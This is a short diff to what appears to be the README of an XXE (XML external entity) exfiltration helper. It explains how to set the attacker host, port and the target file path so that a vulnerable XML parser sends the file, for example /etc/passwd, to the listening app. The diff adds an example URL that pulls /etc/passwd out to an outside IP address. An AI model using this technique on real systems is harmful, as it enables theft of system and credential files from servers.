@@ -15,8 +15,10 @@ Trigger the XML parser with the following XML:
 %trick;]>
 
 Where YOURHOST and YOURPORT needs to be set to the host/port this app
-runs on. FULLPATH needs to be set to the full absolute path of the
-to be read file (e.g. f=/etc/passwd)
+runs on in the URL you provide. FULLPATH needs to be set to the 
+full absolute path of the to be read file (e.g. f=/etc/passwd)
+
+e.g. http://8.8.8.8:443/xml?f=/etc/passwd
 
 The according file will be send to the app and stored under ./files
 
